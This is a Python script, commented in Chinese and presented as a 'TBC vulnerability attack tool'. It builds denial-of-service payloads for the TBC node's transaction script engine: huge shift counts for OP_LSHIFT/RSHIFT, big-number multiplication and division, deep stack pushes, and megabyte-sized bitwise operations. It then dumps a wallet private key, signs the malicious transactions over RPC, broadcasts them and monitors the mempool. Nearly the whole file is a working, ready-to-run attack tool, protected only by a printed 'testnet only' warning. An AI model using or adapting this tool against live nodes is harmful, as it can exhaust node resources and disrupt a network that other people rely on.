# TBC 攻击交易 Python 实现
# 使用 RPC 构造和发送攻击交易

import json
import hashlib
import struct
import time
import requests
from typing import List, Dict, Optional, Tuple

class TBCRPCClient:
    """TBC RPC 客户端"""
    
    def __init__(self, host='localhost', port=18332, user='user', password='pass'):
        self.url = f"http://{host}:{port}"
        self.auth = (user, password)
        self.headers = {'content-type': 'application/json'}
    
    def call(self, method: str, params: List = None) -> Dict:
        """调用 RPC 方法"""
        payload = {
            'jsonrpc': '2.0',
            'method': method,
            'params': params or [],
            'id': int(time.time() * 1000)
        }
        
        try:
            resp = requests.post(
                self.url, 
                json=payload, 
                headers=self.headers, 
                auth=self.auth,
                timeout=300
            )
            return resp.json()
        except Exception as e:
            return {'error': str(e)}


class TBCScriptBuilder:
    """TBC 脚本构造器"""
    
    # 操作码
    OP_0 = 0x00
    OP_1 = 0x51
    OP_PUSHDATA1 = 0x4c
    OP_PUSHDATA2 = 0x4d
    OP_PUSHDATA4 = 0x4e
    OP_LSHIFT = 0x98
    OP_RSHIFT = 0x99
    OP_MUL = 0x95
    OP_DIV = 0x96
    OP_MOD = 0x97
    OP_ADD = 0x93
    OP_SUB = 0x94
    OP_AND = 0x84
    OP_OR = 0x85
    OP_XOR = 0x86
    OP_INVERT = 0x83
    OP_DUP = 0x76
    OP_EQUAL = 0x87
    OP_EQUALVERIFY = 0x88
    OP_CHECKSIG = 0xac
    OP_CHECKMULTISIG = 0xae
    OP_RETURN = 0x6a
    OP_HASH160 = 0xa9
    
    @staticmethod
    def push_data(data: bytes) -> bytes:
        """构造 PUSH 数据操作"""
        length = len(data)
        if length < 0x4c:
            return bytes([length]) + data
        elif length <= 0xff:
            return bytes([0x4c, length]) + data
        elif length <= 0xffff:
            return bytes([0x4d]) + struct.pack('<H', length) + data
        else:
            return bytes([0x4e]) + struct.pack('<I', length) + data
    
    @classmethod
    def create_lshift_attack(cls, shift_bytes: int = 10000) -> bytes:
        """LSHIFT DoS 攻击脚本"""
        script = b''
        # PUSH 极大的移位次数
        shift_count = b'\xff' * shift_bytes
        script += cls.push_data(shift_count)
        # PUSH 数据
        script += cls.push_data(b'\x01')
        # OP_LSHIFT
        script += bytes([cls.OP_LSHIFT])
        return script
    
    @classmethod
    def create_rshift_attack(cls, shift_bytes: int = 10000) -> bytes:
        """RSHIFT DoS 攻击脚本"""
        script = b''
        shift_count = b'\xff' * shift_bytes
        script += cls.push_data(shift_count)
        script += cls.push_data(b'\x01')
        script += bytes([cls.OP_RSHIFT])
        return script
    
    @classmethod
    def create_bignum_mul_attack(cls, num_size: int = 10000) -> bytes:
        """大数乘法 DoS 攻击脚本"""
        script = b''
        num1 = b'\x42' * num_size
        num2 = b'\x43' * num_size
        script += cls.push_data(num1)
        script += cls.push_data(num2)
        script += bytes([cls.OP_MUL])
        return script
    
    @classmethod
    def create_bignum_div_attack(cls, num_size: int = 10000) -> bytes:
        """大数除法 DoS 攻击脚本"""
        script = b''
        dividend = b'\xff' * num_size
        script += cls.push_data(dividend)
        script += cls.push_data(b'\x02')  # 除数
        script += bytes([cls.OP_DIV])
        return script
    
    @classmethod
    def create_stack_attack(cls, num_pushes: int = 100000) -> bytes:
        """栈深度攻击脚本"""
        script = b''
        for _ in range(num_pushes):
            script += cls.push_data(b'\x01')
        return script
    
    @classmethod
    def create_bitwise_attack(cls, size: int = 1000000, op: str = 'xor') -> bytes:
        """位运算 DoS 攻击脚本"""
        ops = {'and': cls.OP_AND, 'or': cls.OP_OR, 'xor': cls.OP_XOR}
        script = b''
        data1 = b'\xaa' * size
        data2 = b'\x55' * size
        script += cls.push_data(data1)
        script += cls.push_data(data2)
        script += bytes([ops.get(op, cls.OP_XOR)])
        return script


class TBCTransactionBuilder:
    """TBC 交易构造器 (手动序列化)"""
    
    def __init__(self, rpc_client: TBCRPCClient):
        self.rpc = rpc_client
    
    @staticmethod
    def hash256(data: bytes) -> bytes:
        """Double SHA256"""
        return hashlib.sha256(hashlib.sha256(data).digest()).digest()
    
    @staticmethod
    def serialize_varint(n: int) -> bytes:
        """序列化变长整数"""
        if n < 0xfd:
            return bytes([n])
        elif n <= 0xffff:
            return bytes([0xfd]) + struct.pack('<H', n)
        elif n <= 0xffffffff:
            return bytes([0xfe]) + struct.pack('<I', n)
        else:
            return bytes([0xff]) + struct.pack('<Q', n)
    
    def create_raw_transaction(
        self,
        inputs: List[Dict],
        outputs: List[Dict],
        locktime: int = 0,
        version: int = 1
    ) -> str:
        """
        手动构造原始交易
        
        参数:
            inputs: [{"txid": "...", "vout": 0, "scriptSig": "...", "sequence": 0xffffffff}]
            outputs: [{"value": 1000, "scriptPubKey": "..."}]
        """
        tx = b''
        
        # Version
        tx += struct.pack('<I', version)
        
        # Input count
        tx += self.serialize_varint(len(inputs))
        
        # Inputs
        for inp in inputs:
            # Previous output hash (txid)
            txid = bytes.fromhex(inp['txid'])[::-1]  # Little endian
            tx += txid
            
            # Previous output index
            tx += struct.pack('<I', inp['vout'])
            
            # ScriptSig
            script_sig = bytes.fromhex(inp.get('scriptSig', ''))
            tx += self.serialize_varint(len(script_sig))
            tx += script_sig
            
            # Sequence
            tx += struct.pack('<I', inp.get('sequence', 0xffffffff))
        
        # Output count
        tx += self.serialize_varint(len(outputs))
        
        # Outputs
        for out in outputs:
            # Value (satoshis)
            tx += struct.pack('<Q', out['value'])
            
            # ScriptPubKey
            script_pubkey = bytes.fromhex(out['scriptPubKey'])
            tx += self.serialize_varint(len(script_pubkey))
            tx += script_pubkey
        
        # LockTime
        tx += struct.pack('<I', locktime)
        
        return tx.hex()
    
    def create_p2sh_attack_transaction(
        self,
        funding_txid: str,
        funding_vout: int,
        funding_amount: int,
        funding_script_pubkey: str,
        redeem_script: bytes,
        private_key_wif: str,
        to_address: str,
        amount: int,
        fee: int = 10000
    ) -> Optional[str]:
        """
        构造 P2SH 攻击交易
        
        流程:
        1. 先创建 P2SH 地址 (包含恶意脚本)
        2. 向 P2SH 地址转账
        3. 从 P2SH 地址花费，提供恶意脚本作为 redeemScript
        """
        # 计算 redeemScript hash
        redeem_script_hash = hashlib.new('ripemd160', 
            hashlib.sha256(redeem_script).digest()
        ).digest()
        
        # P2SH scriptPubKey: OP_HASH160 <20 bytes> OP_EQUAL
        p2sh_script_pubkey = bytes([0xa9, 0x14]) + redeem_script_hash + bytes([0x87])
        
        # 构造输入 (引用 P2SH 输出)
        # scriptSig: <恶意脚本> <其他数据>
        script_sig = TBCScriptBuilder.push_data(redeem_script)
        
        inputs = [{
            'txid': funding_txid,
            'vout': funding_vout,
            'scriptSig': script_sig.hex(),
            'sequence': 0xffffffff
        }]
        
        # 构造输出
        # 可以是 OP_RETURN 或正常地址
        outputs = [{
            'value': amount - fee,
            'scriptPubKey': '6a'  # OP_RETURN
        }]
        
        raw_tx = self.create_raw_transaction(inputs, outputs)
        
        # 使用 RPC 签名
        prevtxs = [{
            'txid': funding_txid,
            'vout': funding_vout,
            'scriptPubKey': funding_script_pubkey,
            'amount': funding_amount / 100000000.0  # BTC 单位
        }]
        
        sign_result = self.rpc.call('signrawtransaction', [raw_tx, prevtxs, [private_key_wif]])
        
        if 'result' in sign_result and sign_result['result']:
            return sign_result['result'].get('hex')
        
        return None
    
    def create_direct_attack_transaction(
        self,
        utxo_txid: str,
        utxo_vout: int,
        utxo_script_pubkey: str,
        utxo_amount: int,
        malicious_script: bytes,
        private_key_wif: str,
        fee: int = 10000
    ) -> Optional[str]:
        """
        构造直接攻击交易
        
        这种交易直接将恶意脚本放在 scriptSig 中
        适用于测试 script 验证漏洞
        """
        # 构造输入
        script_sig = TBCScriptBuilder.push_data(malicious_script)
        
        inputs = [{
            'txid': utxo_txid,
            'vout': utxo_vout,
            'scriptSig': script_sig.hex(),
            'sequence': 0xffffffff
        }]
        
        # 构造输出 (OP_RETURN)
        outputs = [{
            'value': utxo_amount - fee,
            'scriptPubKey': '6a'  # OP_RETURN
        }]
        
        raw_tx = self.create_raw_transaction(inputs, outputs)
        
        # 签名
        prevtxs = [{
            'txid': utxo_txid,
            'vout': utxo_vout,
            'scriptPubKey': utxo_script_pubkey,
            'amount': utxo_amount / 100000000.0
        }]
        
        sign_result = self.rpc.call('signrawtransaction', [raw_tx, prevtxs, [private_key_wif]])
        
        if 'result' in sign_result and sign_result['result']:
            return sign_result['result'].get('hex')
        
        return None


class TBCAttacker:
    """TBC 攻击执行器"""
    
    def __init__(self, rpc_client: TBCRPCClient):
        self.rpc = rpc_client
        self.tx_builder = TBCTransactionBuilder(rpc_client)
    
    def get_test_utxo(self, min_amount: int = 100000) -> Optional[Dict]:
        """获取测试用的 UTXO"""
        result = self.rpc.call('listunspent', [0, 9999999, [], True, {'minimumAmount': min_amount / 100000000.0}])
        
        if 'result' in result and result['result']:
            utxos = result['result']
            if utxos:
                return {
                    'txid': utxos[0]['txid'],
                    'vout': utxos[0]['vout'],
                    'amount': int(utxos[0]['amount'] * 100000000),
                    'scriptPubKey': utxos[0]['scriptPubKey'],
                    'address': utxos[0]['address']
                }
        return None
    
    def execute_lshift_attack(self, shift_size: int = 10000, fee: int = 10000) -> Optional[str]:
        """执行 LSHIFT DoS 攻击"""
        print(f"[*] 准备 LSHIFT DoS 攻击 (shift_size={shift_size})")
        
        # 获取 UTXO
        utxo = self.get_test_utxo(min_amount=fee + 10000)
        if not utxo:
            print("[!] 错误: 没有足够的 UTXO")
            return None
        
        print(f"[*] 使用 UTXO: {utxo['txid']}:{utxo['vout']} ({utxo['amount']} sat)")
        
        # 构造恶意脚本
        malicious_script = TBCScriptBuilder.create_lshift_attack(shift_size)
        print(f"[*] 恶意脚本大小: {len(malicious_script)} bytes")
        
        # 获取私钥 (需要解锁钱包)
        privkey_result = self.rpc.call('dumpprivkey', [utxo['address']])
        if 'error' in privkey_result or not privkey_result.get('result'):
            print("[!] 错误: 无法获取私钥，请确保钱包已解锁")
            return None
        
        private_key_wif = privkey_result['result']
        
        # 构造攻击交易
        tx_hex = self.tx_builder.create_direct_attack_transaction(
            utxo_txid=utxo['txid'],
            utxo_vout=utxo['vout'],
            utxo_script_pubkey=utxo['scriptPubKey'],
            utxo_amount=utxo['amount'],
            malicious_script=malicious_script,
            private_key_wif=private_key_wif,
            fee=fee
        )
        
        if not tx_hex:
            print("[!] 错误: 构造交易失败")
            return None
        
        print(f"[*] 交易构造成功，大小: {len(tx_hex) // 2} bytes")
        
        # 广播交易
        print("[*] 广播交易...")
        broadcast_result = self.rpc.call('sendrawtransaction', [tx_hex])
        
        if 'error' in broadcast_result and broadcast_result['error']:
            print(f"[!] 广播失败: {broadcast_result['error']}")
            return None
        
        txid = broadcast_result.get('result')
        print(f"[+] 攻击交易已广播: {txid}")
        
        return txid
    
    def execute_bignum_mul_attack(self, num_size: int = 10000, fee: int = 10000) -> Optional[str]:
        """执行大数乘法 DoS 攻击"""
        print(f"[*] 准备 BigNum MUL DoS 攻击 (num_size={num_size})")
        
        utxo = self.get_test_utxo(min_amount=fee + 10000)
        if not utxo:
            print("[!] 错误: 没有足够的 UTXO")
            return None
        
        print(f"[*] 使用 UTXO: {utxo['txid']}:{utxo['vout']}")
        
        malicious_script = TBCScriptBuilder.create_bignum_mul_attack(num_size)
        print(f"[*] 恶意脚本大小: {len(malicious_script)} bytes")
        
        privkey_result = self.rpc.call('dumpprivkey', [utxo['address']])
        if 'error' in privkey_result:
            print("[!] 错误: 无法获取私钥")
            return None
        
        private_key_wif = privkey_result['result']
        
        tx_hex = self.tx_builder.create_direct_attack_transaction(
            utxo['txid'], utxo['vout'], utxo['scriptPubKey'],
            utxo['amount'], malicious_script, private_key_wif, fee
        )
        
        if not tx_hex:
            print("[!] 构造交易失败")
            return None
        
        broadcast_result = self.rpc.call('sendrawtransaction', [tx_hex])
        
        if 'error' in broadcast_result:
            print(f"[!] 广播失败: {broadcast_result['error']}")
            return None
        
        txid = broadcast_result['result']
        print(f"[+] 攻击交易已广播: {txid}")
        
        return txid
    
    def monitor_attack(self, txid: str, timeout: int = 300):
        """监控攻击效果"""
        print(f"[*] 监控交易 {txid}")
        print(f"[*] 超时时间: {timeout} 秒")
        
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            # 检查交易是否在内存池
            mempool_result = self.rpc.call('getrawmempool', [True])
            
            if 'result' in mempool_result:
                mempool = mempool_result['result']
                if txid in mempool:
                    tx_info = mempool[txid]
                    print(f"[*] 交易在内存池中 (已等待 {int(time.time() - start_time)}s)")
                    print(f"    祖先数量: {tx_info.get('ancestorcount', 'N/A')}")
                    print(f"    费用: {tx_info.get('fee', 'N/A')}")
                else:
                    # 检查是否已确认
                    tx_result = self.rpc.call('gettransaction', [txid])
                    if 'result' in tx_result and tx_result['result']:
                        print(f"[+] 交易已确认!")
                        print(f"    区块: {tx_result['result'].get('blockhash', 'N/A')}")
                        return True
            
            time.sleep(5)
        
        print("[!] 监控超时")
        return False


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description='TBC 漏洞攻击工具')
    parser.add_argument('--host', default='localhost', help='RPC 主机')
    parser.add_argument('--port', type=int, default=18332, help='RPC 端口')
    parser.add_argument('--user', default='user', help='RPC 用户名')
    parser.add_argument('--password', default='pass', help='RPC 密码')
    parser.add_argument('--attack', choices=['lshift', 'rshift', 'mul', 'div', 'all'], 
                       default='lshift', help='攻击类型')
    parser.add_argument('--size', type=int, default=10000, help='攻击数据大小')
    parser.add_argument('--fee', type=int, default=10000, help='交易手续费')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("TBC 漏洞攻击工具")
    print("警告: 仅在测试网使用!")
    print("=" * 60)
    print()
    
    # 创建 RPC 客户端
    rpc = TBCRPCClient(args.host, args.port, args.user, args.password)
    
    # 检查连接
    info = rpc.call('getblockchaininfo')
    if 'error' in info:
        print(f"[!] RPC 连接失败: {info['error']}")
        return
    
    print(f"[*] 连接到 TBC 节点")
    print(f"[*] 区块高度: {info['result'].get('blocks', 'N/A')}")
    print()
    
    # 创建攻击器
    attacker = TBCAttacker(rpc)
    
    # 执行攻击
    if args.attack == 'lshift':
        txid = attacker.execute_lshift_attack(args.size, args.fee)
        if txid:
            attacker.monitor_attack(txid)
    
    elif args.attack == 'mul':
        txid = attacker.execute_bignum_mul_attack(args.size, args.fee)
        if txid:
            attacker.monitor_attack(txid)
    
    elif args.attack == 'all':
        print("[*] 执行所有攻击测试")
        for attack_type in ['lshift', 'mul']:
            print(f"\n{'='*60}")
            print(f"[*] 攻击类型: {attack_type}")
            print('='*60)
            
            if attack_type == 'lshift':
                txid = attacker.execute_lshift_attack(args.size, args.fee)
            else:
                txid = attacker.execute_bignum_mul_attack(args.size, args.fee)
            
            if txid:
                attacker.monitor_attack(txid, timeout=60)
            
            time.sleep(5)  # 间隔


if __name__ == '__main__':
    main()
